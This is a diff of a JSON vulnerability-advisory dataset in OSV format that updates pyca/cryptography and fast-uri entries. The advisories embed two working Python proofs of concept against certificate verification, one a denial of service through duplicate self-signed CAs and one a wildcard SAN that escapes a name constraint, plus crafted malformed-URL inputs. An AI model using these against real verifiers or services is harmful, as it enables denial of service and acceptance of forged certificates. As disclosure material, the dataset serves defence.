@@ -2295,7 +2295,7 @@
                     {
                       "events": [
                         {
-                          "introduced": "0"
+                          "introduced": "42.0.0"
                         },
                         {
                           "fixed": "49.0.0"
@@ -2305,127 +2305,6 @@
                     }
                   ],
                   "versions": [
-                    "0.1",
-                    "0.2",
-                    "0.2.1",
-                    "0.2.2",
-                    "0.3",
-                    "0.4",
-                    "0.5",
-                    "0.5.1",
-                    "0.5.2",
-                    "0.5.3",
-                    "0.5.4",
-                    "0.6",
-                    "0.6.1",
-                    "0.7",
-                    "0.7.1",
-                    "0.7.2",
-                    "0.8",
-                    "0.8.1",
-                    "0.8.2",
-                    "0.9",
-                    "0.9.1",
-                    "0.9.2",
-                    "0.9.3",
-                    "1.0",
-                    "1.0.1",
-                    "1.0.2",
-                    "1.1",
-                    "1.1.1",
-                    "1.1.2",
-                    "1.2",
-                    "1.2.1",
-                    "1.2.2",
-                    "1.2.3",
-                    "1.3",
-                    "1.3.1",
-                    "1.3.2",
-                    "1.3.3",
-                    "1.3.4",
-                    "1.4",
-                    "1.5",
-                    "1.5.1",
-                    "1.5.2",
-                    "1.5.3",
-                    "1.6",
-                    "1.7",
-                    "1.7.1",
-                    "1.7.2",
-                    "1.8",
-                    "1.8.1",
-                    "1.8.2",
-                    "1.9",
-                    "2.0",
-                    "2.0.1",
-                    "2.0.2",
-                    "2.0.3",
-                    "2.1",
-                    "2.1.1",
-                    "2.1.2",
-                    "2.1.3",
-                    "2.1.4",
-                    "2.2",
-                    "2.2.1",
-                    "2.2.2",
-                    "2.3",
-                    "2.3.1",
-                    "2.4",
-                    "2.4.1",
-                    "2.4.2",
-                    "2.5",
-                    "2.6",
-                    "2.6.1",
-                    "2.7",
-                    "2.8",
-                    "2.9",
-                    "2.9.1",
-                    "2.9.2",
-                    "3.0",
-                    "3.1",
-                    "3.1.1",
-                    "3.2",
-                    "3.2.1",
-                    "3.3",
-                    "3.3.1",
-                    "3.3.2",
-                    "3.4",
-                    "3.4.1",
-                    "3.4.2",
-                    "3.4.3",
-                    "3.4.4",
-                    "3.4.5",
-                    "3.4.6",
-                    "3.4.7",
-                    "3.4.8",
-                    "35.0.0",
-                    "36.0.0",
-                    "36.0.1",
-                    "36.0.2",
-                    "37.0.0",
-                    "37.0.1",
-                    "37.0.2",
-                    "37.0.3",
-                    "37.0.4",
-                    "38.0.0",
-                    "38.0.1",
-                    "38.0.2",
-                    "38.0.3",
-                    "38.0.4",
-                    "39.0.0",
-                    "39.0.1",
-                    "39.0.2",
-                    "40.0.0",
-                    "40.0.1",
-                    "40.0.2",
-                    "41.0.0",
-                    "41.0.1",
-                    "41.0.2",
-                    "41.0.3",
-                    "41.0.4",
-                    "41.0.5",
-                    "41.0.6",
-                    "41.0.7",
                     "42.0.0",
                     "42.0.1",
                     "42.0.2",
@@ -2474,12 +2353,12 @@
                 ],
                 "github_reviewed": true,
                 "github_reviewed_at": "2026-08-03T21:26:50Z",
-                "nvd_published_at": null,
+                "nvd_published_at": "2026-08-03T22:16:52Z",
                 "severity": "HIGH"
               },
               "details": "### Summary\nWhen resolving invalid certificate chains that include duplicate copies of self-signed certificates, the processing recursively invokes the same candidate, leading to an exponential blowup. Although the limitation that the chain depth cannot exceed a specified maximum depth prevents unbounded recursion and guarantees termination, an attacker-controlled certificate chain can lead the processing to easily take more than 5s to reject in testing. This amplification could form the basis for a resource exhaustion denial of service attack.\n\nThis work was completed by Trail of Bits as part of the Patch The Planet project in collaboration with OpenAI. The finding was identified primarily by the Codex coding agent, and manually reviewed before submission. \n\n### Details\nThe core issue arises in the recursive nature of `build_chain_inner`, which does not de-duplicate against previously analyzed candidates.\n\n```python\n    fn build_chain_inner(\n        \u0026self,\n        working_cert: \u0026VerificationCertificate\u003c'chain, B\u003e,\n        current_depth: u8,\n        working_cert_extensions: \u0026Extensions\u003c'chain\u003e,\n        name_chain: NameChain\u003c'_, 'chain\u003e,\n        budget: \u0026mut Budget,\n    ) -\u003e ValidationResult\u003c'chain, Chain\u003c'chain, B\u003e, B\u003e {\n        if let Some(nc) = working_cert_extensions.get_extension(\u0026NAME_CONSTRAINTS_OID) {\n            name_chain.evaluate_constraints(\u0026nc.value()?, budget)?;\n        }\n\n        // Look in the store's root set to see if the working cert is listed.\n        // If it is, we've reached the end.\n        if self.store.contains(working_cert) {\n            return Ok(vec![working_cert.clone()]);\n        }\n\n        // Check that our current depth does not exceed our policy-configured\n        // max depth. We do this after the root set check, since the depth\n        // only measures the intermediate chain's length, not the root or leaf.\n        if current_depth \u003e self.policy.max_chain_depth {\n            return Err(ValidationError::new(ValidationErrorKind::Other(\n                \"chain construction exceeds max depth\".into(),\n            )));\n        }\n\n        // Otherwise, we collect a list of potential issuers for this cert,\n        // and continue with the first that verifies.\n        let mut last_err: Option\u003cValidationError\u003c'_, B\u003e\u003e = None;\n        for issuing_cert_candidate in self.potential_issuers(working_cert) {\n            // A candidate issuer is said to verify if it both\n            // signs for the working certificate and conforms to the\n            // policy.\n            let issuer_extensions = issuing_cert_candidate.certificate().extensions()?;\n            match self.policy.valid_issuer(\n                issuing_cert_candidate,\n                working_cert,\n                current_depth,\n                \u0026issuer_extensions,\n            ) {\n                Ok(_) =\u003e {\n                    match self.build_chain_inner(\n```\n\nA sufficient patch is to track valid issuers, and to skip seen ones before recursing. By tracking valid issuers only, validation and custom extension-policy callbacks still run.\n\n```rust\n          let mut seen_valid_issuers = Vec::\u003c\u0026VerificationCertificate\u003c'chain, B\u003e\u003e::new();\n          for issuing_cert_candidate in self.potential_issuers(working_cert) {\n          . . .\n                  Ok(_) =\u003e {\n                      if seen_valid_issuers.contains(\u0026issuing_cert_candidate) {\n                         continue;\n                      }\n                      seen_valid_issuers.push(issuing_cert_candidate);\n \n                      match self.build_chain_inner(\n                          issuing_cert_candidate,\n                          // NOTE(ww): According to RFC 5280, we should only\n```\n\nIn testing, this fix removed the exponential blowup without breaking apparent correctness. \n\n```\nduplicates,max_depth,result,seconds\n1,7,rejected,0.000464 -\u003e 1,7,rejected,0.000667\n2,7,rejected,0.025154 -\u003e 2,7,rejected,0.001229\n3,7,rejected,0.489924 -\u003e 3,7,rejected,0.001619 \n4,7,rejected,4.309403 -\u003e 4,7,rejected,0.002144\n3,8,rejected,1.468193 -\u003e 3,8,rejected,0.001811\n4,8,timeout\u003e5s,       -\u003e 4,8,rejected,0.002410\n5,7,timeout\u003e5s,       -\u003e 5,7,rejected,0.002640\n6,6,timeout\u003e5s,       -\u003e 6,6,rejected,0.002829\n```\n\n### PoC\nThe following script benchmarks processing times for malicious cert chains.\n\n```python\nimport datetime\nimport multiprocessing\nimport time\n\nimport cryptography\nfrom cryptography import x509\nfrom cryptography.hazmat.primitives import hashes\nfrom cryptography.hazmat.primitives.asymmetric import ec\nfrom cryptography.x509.oid import ExtendedKeyUsageOID, NameOID\nfrom cryptography.x509.verification import (\n    DNSName,\n    PolicyBuilder,\n    Store,\n    VerificationError,\n)\n\nNOW = datetime.datetime(2024, 1, 1, tzinfo=datetime.timezone.utc)\nTIMEOUT = 5\nCA_KEY_USAGE = x509.KeyUsage(\n    digital_signature=True,\n    content_commitment=False,\n    key_encipherment=False,\n    data_encipherment=False,\n    key_agreement=False,\n    key_cert_sign=True,\n    crl_sign=True,\n    encipher_only=False,\n    decipher_only=False,\n)\nEE_KEY_USAGE = x509.KeyUsage(\n    digital_signature=True,\n    content_commitment=False,\n    key_encipherment=False,\n    data_encipherment=False,\n    key_agreement=False,\n    key_cert_sign=False,\n    crl_sign=False,\n    encipher_only=False,\n    decipher_only=False,\n)\n\ndef name(common_name):\n    return x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, common_name)])\n\ndef base_builder(subject, issuer, public_key, serial):\n    return (\n        x509.CertificateBuilder()\n        .subject_name(subject)\n        .issuer_name(issuer)\n        .public_key(public_key)\n        .serial_number(serial)\n        .not_valid_before(NOW - datetime.timedelta(days=1))\n        .not_valid_after(NOW + datetime.timedelta(days=30))\n    )\n\ndef make_ca(common_name, serial):\n    private_key = ec.generate_private_key(ec.SECP256R1())\n    subject = name(common_name)\n    cert = (\n        base_builder(subject, subject, private_key.public_key(), serial)\n        .add_extension(x509.BasicConstraints(ca=True, path_length=None), True)\n        .add_extension(CA_KEY_USAGE, True)\n        .add_extension(\n            x509.SubjectKeyIdentifier.from_public_key(private_key.public_key()),\n            False,\n        )\n        .sign(private_key, hashes.SHA256())\n    )\n    return private_key, cert\n\ndef make_leaf(issuer_key, issuer_cert):\n    private_key = ec.generate_private_key(ec.SECP256R1())\n    return (\n        base_builder(name(\"leaf\"), issuer_cert.subject, private_key.public_key(), 100)\n        .add_extension(x509.BasicConstraints(ca=False, path_length=None), True)\n        .add_extension(EE_KEY_USAGE, True)\n        .add_extension(x509.SubjectAlternativeName([x509.DNSName(\"example.com\")]), False)\n        .add_extension(\n            x509.AuthorityKeyIdentifier.from_issuer_public_key(issuer_key.public_key()),\n            False,\n        )\n        .add_extension(x509.ExtendedKeyUsage([ExtendedKeyUsageOID.SERVER_AUTH]), False)\n        .sign(issuer_key, hashes.SHA256())\n    )\n\ndef build_material():\n    looping_key, looping_ca = make_ca(\"looping self-signed CA\", 1)\n    _, unrelated_root = make_ca(\"unrelated trust anchor\", 2)\n    leaf = make_leaf(looping_key, looping_ca)\n    return leaf, looping_ca, unrelated_root\n\ndef verify_case(duplicates, max_depth, queue):\n    leaf, looping_ca, unrelated_root = build_material()\n    verifier = (\n        PolicyBuilder()\n        .store(Store([unrelated_root]))\n        .time(NOW)\n        .max_chain_depth(max_depth)\n        .build_server_verifier(DNSName(\"example.com\"))\n    )\n\n    start = time.perf_counter()\n    try:\n        verifier.verify(leaf, [looping_ca] * duplicates)\n        result = \"accepted\"\n    except VerificationError:\n        result = \"rejected\"\n    queue.put((result, time.perf_counter() - start))\n\ndef run_case(duplicates, max_depth):\n    queue = multiprocessing.Queue()\n    process = multiprocessing.Process(\n        target=verify_case,\n        args=(duplicates, max_depth, queue),\n    )\n    process.start()\n    process.join(TIMEOUT)\n\n    if process.is_alive():\n        process.terminate()\n        process.join()\n        print(f\"{duplicates},{max_depth},timeout\u003e{TIMEOUT}s,\")\n        return\n\n    result, elapsed = queue.get()\n    print(f\"{duplicates},{max_depth},{result},{elapsed:.6f}\")\n\nif __name__ == \"__main__\":\n    print(\"duplicates,max_depth,result,seconds\")\n    for case in [(1, 7), (2, 7), (3, 7), (4, 7), (3, 8), (4, 8), (5, 7), (6, 6)]:\n        run_case(*case)\n```\n\n### Impact\nThis issue exposes an amplification pathway over data that in many applications may be user-controlled, leading to the possibility of a denial of service through resource exhaustion. As the correctness of validation is not affected, the integrity of a system cannot be compromised through this vector, only its availability.",
               "id": "GHSA-jwv3-5hgf-82ww",
-              "modified": "2026-08-05T08:56:56.745489939Z",
+              "modified": "2026-09-04T21:30:07.323860491Z",
               "published": "2026-08-03T21:26:50Z",
               "references": [
                 {
@@ -2487,8 +2366,16 @@
                   "url": "https://github.com/pyca/cryptography/security/advisories/GHSA-jwv3-5hgf-82ww"
                 },
                 {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-69249"
+                },
+                {
                   "type": "WEB",
                   "url": "https://github.com/pyca/cryptography/pull/14960"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/pyca/cryptography/commit/3763aa79b"
                 },
                 {
                   "type": "WEB",
@@ -2497,12 +2384,16 @@
                 {
                   "type": "PACKAGE",
                   "url": "https://github.com/pyca/cryptography"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/pypa/advisory-database/tree/main/vulns/cryptography/PYSEC-2026-3553.yaml"
                 }
               ],
               "related": [
                 "CGA-mfcr-j98w-873f"
               ],
-              "schema_version": "1.7.5",
+              "schema_version": "1.9.0",
               "severity": [
                 {
                   "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
@@ -2527,7 +2418,7 @@
                     {
                       "events": [
                         {
-                          "introduced": "0"
+                          "introduced": "45.0.0"
                         },
                         {
                           "fixed": "49.0.0"
@@ -2537,143 +2428,6 @@
                     }
                   ],
                   "versions": [
-                    "0.1",
-                    "0.2",
-                    "0.2.1",
-                    "0.2.2",
-                    "0.3",
-                    "0.4",
-                    "0.5",
-                    "0.5.1",
-                    "0.5.2",
-                    "0.5.3",
-                    "0.5.4",
-                    "0.6",
-                    "0.6.1",
-                    "0.7",
-                    "0.7.1",
-                    "0.7.2",
-                    "0.8",
-                    "0.8.1",
-                    "0.8.2",
-                    "0.9",
-                    "0.9.1",
-                    "0.9.2",
-                    "0.9.3",
-                    "1.0",
-                    "1.0.1",
-                    "1.0.2",
-                    "1.1",
-                    "1.1.1",
-                    "1.1.2",
-                    "1.2",
-                    "1.2.1",
-                    "1.2.2",
-                    "1.2.3",
-                    "1.3",
-                    "1.3.1",
-                    "1.3.2",
-                    "1.3.3",
-                    "1.3.4",
-                    "1.4",
-                    "1.5",
-                    "1.5.1",
-                    "1.5.2",
-                    "1.5.3",
-                    "1.6",
-                    "1.7",
-                    "1.7.1",
-                    "1.7.2",
-                    "1.8",
-                    "1.8.1",
-                    "1.8.2",
-                    "1.9",
-                    "2.0",
-                    "2.0.1",
-                    "2.0.2",
-                    "2.0.3",
-                    "2.1",
-                    "2.1.1",
-                    "2.1.2",
-                    "2.1.3",
-                    "2.1.4",
-                    "2.2",
-                    "2.2.1",
-                    "2.2.2",
-                    "2.3",
-                    "2.3.1",
-                    "2.4",
-                    "2.4.1",
-                    "2.4.2",
-                    "2.5",
-                    "2.6",
-                    "2.6.1",
-                    "2.7",
-                    "2.8",
-                    "2.9",
-                    "2.9.1",
-                    "2.9.2",
-                    "3.0",
-                    "3.1",
-                    "3.1.1",
-                    "3.2",
-                    "3.2.1",
-                    "3.3",
-                    "3.3.1",
-                    "3.3.2",
-                    "3.4",
-                    "3.4.1",
-                    "3.4.2",
-                    "3.4.3",
-                    "3.4.4",
-                    "3.4.5",
-                    "3.4.6",
-                    "3.4.7",
-                    "3.4.8",
-                    "35.0.0",
-                    "36.0.0",
-                    "36.0.1",
-                    "36.0.2",
-                    "37.0.0",
-                    "37.0.1",
-                    "37.0.2",
-                    "37.0.3",
-                    "37.0.4",
-                    "38.0.0",
-                    "38.0.1",
-                    "38.0.2",
-                    "38.0.3",
-                    "38.0.4",
-                    "39.0.0",
-                    "39.0.1",
-                    "39.0.2",
-                    "40.0.0",
-                    "40.0.1",
-                    "40.0.2",
-                    "41.0.0",
-                    "41.0.1",
-                    "41.0.2",
-                    "41.0.3",
-                    "41.0.4",
-                    "41.0.5",
-                    "41.0.6",
-                    "41.0.7",
-                    "42.0.0",
-                    "42.0.1",
-                    "42.0.2",
-                    "42.0.3",
-                    "42.0.4",
-                    "42.0.5",
-                    "42.0.6",
-                    "42.0.7",
-                    "42.0.8",
-                    "43.0.0",
-                    "43.0.1",
-                    "43.0.3",
-                    "44.0.0",
-                    "44.0.1",
-                    "44.0.2",
-                    "44.0.3",
                     "45.0.0",
                     "45.0.1",
                     "45.0.2",
@@ -2706,12 +2460,12 @@
                 ],
                 "github_reviewed": true,
                 "github_reviewed_at": "2026-08-03T21:26:57Z",
-                "nvd_published_at": null,
+                "nvd_published_at": "2026-08-03T22:16:52Z",
                 "severity": "MODERATE"
               },
               "details": "### Summary\nIf an intermediate constrained CA permits the DNS name `foo.example.com`, and the leaf certificate has a wildcard in its DNS SAN of `*.example.com`, python-cryptography's verifier accepts which allows escaping outside of the permitted names.\n\n### PoC\n\n```\n#!/usr/bin/env python3\n\"\"\"Standalone PoC: pyca's DNSConstraint::matches admits a too-broad wildcard SAN.\n\nSetup:\n  Sub-CA permitted constraint: dNSName = foo.example.com\n  Leaf SAN:                    dNSName = *.example.com\nExpected: rejection (RFC 5280 §4.2.1.10 + standard wildcard semantics).\nObserved: pyca accepts; further, asks server-verifier whether the leaf is\nauthoritative for `bar.example.com` and pyca answers yes — a sub-CA scope\nescape.\n\"\"\"\nimport datetime\nfrom cryptography import x509\nfrom cryptography.x509.oid import NameOID\nfrom cryptography.hazmat.primitives import hashes\nfrom cryptography.hazmat.primitives.asymmetric import ec\nfrom cryptography.x509.verification import (\n    PolicyBuilder, Store, ExtensionPolicy, Criticality, VerificationError,\n)\n\nnow = datetime.datetime(2027, 1, 1, tzinfo=datetime.timezone.utc)\nday = datetime.timedelta(days=1)\n\ndef build(subject, issuer, key, issuer_key, ca, exts=()):\n    b = (x509.CertificateBuilder()\n         .subject_name(subject).issuer_name(issuer)\n         .public_key(key.public_key())\n         .serial_number(x509.random_serial_number())\n         .not_valid_before(now - 30 * day)\n         .not_valid_after(now + 3650 * day)\n         .add_extension(x509.BasicConstraints(ca=ca, path_length=None), critical=True))\n    for e, c in exts:\n        b = b.add_extension(e, c)\n    return b.sign(issuer_key, hashes.SHA256())\n\n# Root\nrk = ec.generate_private_key(ec.SECP256R1())\nrn = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, \"Test Root\")])\nroot = build(rn, rn, rk, rk, True)\n\n# Sub-CA constrained to foo.example.com\nsk = ec.generate_private_key(ec.SECP256R1())\nsn = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, \"Sub-CA\")])\nnc = x509.NameConstraints(\n    permitted_subtrees=[x509.DNSName(\"foo.example.com\")],\n    excluded_subtrees=None,\n)\nsub = build(sn, rn, sk, rk, True, [(nc, True)])\n\n# Leaf with SAN *.example.com (over-broad relative to the constraint)\nlk = ec.generate_private_key(ec.SECP256R1())\nln = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, \"Leaf\")])\nsan = x509.SubjectAlternativeName([x509.DNSName(\"*.example.com\")])\nleaf = build(ln, sn, lk, sk, False, [(san, False)])\n\n# Policies\nca_pol = ExtensionPolicy.permit_all().require_present(\n    x509.BasicConstraints, Criticality.AGNOSTIC, None,\n)\nee_pol = ExtensionPolicy.permit_all().require_present(\n    x509.SubjectAlternativeName, Criticality.AGNOSTIC, None,\n)\nv = (\n    PolicyBuilder()\n    .store(Store([root]))\n    .time(now)\n    .extension_policies(ca_policy=ca_pol, ee_policy=ee_pol)\n    .build_server_verifier(x509.DNSName(\"bar.example.com\"))\n)\ntry:\n    v.verify(leaf, [sub])\n    print(\"BUG: pyca trusted leaf as bar.example.com though sub-CA was constrained to foo.example.com\")\nexcept VerificationError as e:\n    print(f\"EXPECTED: VerificationError: {e}\")\n```\n\n### Impact\n\nAcceptance of invalid certificate chain.",
               "id": "GHSA-m2h6-j472-rp4c",
-              "modified": "2026-08-05T08:56:57.182506215Z",
+              "modified": "2026-09-02T13:30:06.090408200Z",
               "published": "2026-08-03T21:26:57Z",
               "references": [
                 {
@@ -2719,8 +2473,16 @@
                   "url": "https://github.com/pyca/cryptography/security/advisories/GHSA-m2h6-j472-rp4c"
                 },
                 {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-69248"
+                },
+                {
                   "type": "WEB",
                   "url": "https://github.com/pyca/cryptography/pull/14888"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/pyca/cryptography/commit/286c89128"
                 },
                 {
                   "type": "WEB",
@@ -2729,12 +2491,16 @@
                 {
                   "type": "PACKAGE",
                   "url": "https://github.com/pyca/cryptography"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/pypa/advisory-database/tree/main/vulns/cryptography/PYSEC-2026-3554.yaml"
                 }
               ],
               "related": [
                 "CGA-wjwr-68xg-phr3"
               ],
-              "schema_version": "1.7.5",
+              "schema_version": "1.9.0",
               "severity": [
                 {
                   "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:H/VA:N/SC:N/SI:N/SA:N/E:P",
@@ -32335,7 +32101,621 @@
             "name": "fast-uri",
             "version": "3.1.5",
             "ecosystem": "npm"
-          }
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-5jgf-p345-68v8"
+              ],
+              "aliases": [
+                "CVE-2026-75931",
+                "GHSA-5jgf-p345-68v8"
+              ],
+              "max_severity": "7.5"
+            },
+            {
+              "ids": [
+                "GHSA-f65p-4m7j-42xc"
+              ],
+              "aliases": [
+                "CVE-2026-75975",
+                "GHSA-f65p-4m7j-42xc"
+              ],
+              "max_severity": "7.5"
+            },
+            {
+              "ids": [
+                "GHSA-fph4-wmhf-6fwf"
+              ],
+              "aliases": [
+                "CVE-2026-75899",
+                "GHSA-fph4-wmhf-6fwf"
+              ],
+              "max_severity": "7.5"
+            },
+            {
+              "ids": [
+                "GHSA-jqff-g426-hqxp"
+              ],
+              "aliases": [
+                "CVE-2026-76172",
+                "GHSA-jqff-g426-hqxp"
+              ],
+              "max_severity": "7.5"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-5jgf-p345-68v8/GHSA-5jgf-p345-68v8.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "fast-uri",
+                    "purl": "pkg:npm/fast-uri"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "2.4.2"
+                        },
+                        {
+                          "fixed": "2.4.5"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-5jgf-p345-68v8/GHSA-5jgf-p345-68v8.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "fast-uri",
+                    "purl": "pkg:npm/fast-uri"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "3.1.3"
+                        },
+                        {
+                          "fixed": "3.1.6"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-5jgf-p345-68v8/GHSA-5jgf-p345-68v8.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "fast-uri",
+                    "purl": "pkg:npm/fast-uri"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "4.0.1"
+                        },
+                        {
+                          "fixed": "4.1.3"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2026-75931"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-436"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-09-02T15:44:30Z",
+                "nvd_published_at": "2026-08-24T10:16:40Z",
+                "severity": "HIGH"
+              },
+              "details": "### Impact\n\n`fast-uri` canonicalizes a host to its ASCII form only when the input carries an explicit scheme. When `resolve()` resolves a scheme-relative reference (`//host/`) against a scheme-bearing base, it still emits the host verbatim even though the effective scheme is known, so re-parsing the resolved URI yields a different host than the one `resolve()` returned. An application that resolves an untrusted reference with `fast-uri` and then checks or routes on the resulting host can make a policy decision on one host and reach another. This is an incomplete-fix variant of CVE-2026-13676, whose IDN canonicalization was applied only to the scheme-bearing form.\n\n### Patches\n\nUpgrade to `fast-uri` 2.4.5, 3.1.6, or 4.1.3. `resolve()` now canonicalizes the host once the effective scheme is known, and fails closed if a raw non-ASCII host cannot be converted.\n\n### Workarounds\n\nResolve scheme-relative references against a base that carries a scheme before performing any host-policy or origin check.",
+              "id": "GHSA-5jgf-p345-68v8",
+              "modified": "2026-09-03T16:25:59.089522632Z",
+              "published": "2026-09-02T15:44:30Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/fastify/fast-uri/security/advisories/GHSA-5jgf-p345-68v8"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-75931"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/fastify/fast-uri/commit/0256bc8d1f28b5d0ac657faf67e2411a189dfcb5"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/fastify/fast-uri/commit/444ecdad447db2cc23c4d422acc6f0daa6fa8eef"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/fastify/fast-uri/commit/4e4ebd8b245f6ca16e448203559eea3e545453a3"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://cna.openjsf.org/security-advisories.html"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/fastify/fast-uri"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/fastify/fast-uri/releases/tag/v2.4.5"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/fastify/fast-uri/releases/tag/v3.1.6"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/fastify/fast-uri/releases/tag/v4.1.3"
+                }
+              ],
+              "related": [
+                "CGA-956q-rj3q-c674"
+              ],
+              "schema_version": "1.9.0",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "fast-uri vulnerable to host confusion via skipped IDN canonicalization on scheme-relative references"
+            },
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-f65p-4m7j-42xc/GHSA-f65p-4m7j-42xc.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "fast-uri",
+                    "purl": "pkg:npm/fast-uri"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "2.3.1"
+                        },
+                        {
+                          "fixed": "2.4.5"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-f65p-4m7j-42xc/GHSA-f65p-4m7j-42xc.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "fast-uri",
+                    "purl": "pkg:npm/fast-uri"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "3.0.0"
+                        },
+                        {
+                          "fixed": "3.1.6"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-f65p-4m7j-42xc/GHSA-f65p-4m7j-42xc.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "fast-uri",
+                    "purl": "pkg:npm/fast-uri"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "4.0.0"
+                        },
+                        {
+                          "fixed": "4.1.3"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2026-75975"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-20",
+                  "CWE-918"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-09-02T15:43:30Z",
+                "nvd_published_at": "2026-08-24T10:16:40Z",
+                "severity": "HIGH"
+              },
+              "details": "### Impact\n\n`fast-uri` does not validate the complete RFC 3986 grammar for bracketed IPv6 literals, so a malformed literal with invalid trailing text is silently truncated to a different valid IPv6 address with no error reported. For example, `normalize('http://[::not-valid]/private')` returns `http://[::]/private`, and `[fc00::not-hex]` and `[fe80::not-hex]` collapse to `[fc00::]` and `[fe80::]`. An application that normalizes an untrusted URL before an outbound request, redirect, or host-policy check can be routed to a local or private address such as loopback (`::1`), unique-local, or link-local. Because `parse().error` is unset for these inputs, checking it does not protect the consumer.\n\n### Patches\n\nUpgrade to `fast-uri` 2.4.5, 3.1.6, or 4.1.3. Malformed IPv6 literals are now rejected with a host error instead of being normalized to a valid address.\n\n### Workarounds\n\nReject untrusted URLs whose host is a bracketed IPv6 literal before passing them to `fast-uri`, or route outbound requests against an explicit allowlist of addresses rather than trusting the normalized host.",
+              "id": "GHSA-f65p-4m7j-42xc",
+              "modified": "2026-09-03T16:25:59.227899335Z",
+              "published": "2026-09-02T15:43:30Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/fastify/fast-uri/security/advisories/GHSA-f65p-4m7j-42xc"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-75975"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/fastify/fast-uri/commit/3728465caacef4b16bc84b7d14760f1c8fe41595"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/fastify/fast-uri/commit/607bfbe953f28a14c2e06ae64aff38c81ca2937f"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/fastify/fast-uri/commit/9161eded1ff55fad9d9714c6ad6c0f0283547799"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://cna.openjsf.org/security-advisories.html"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/fastify/fast-uri"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/fastify/fast-uri/releases/tag/v2.4.5"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/fastify/fast-uri/releases/tag/v3.1.6"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/fastify/fast-uri/releases/tag/v4.1.3"
+                }
+              ],
+              "related": [
+                "CGA-hw9p-v29w-g2vx"
+              ],
+              "schema_version": "1.9.0",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
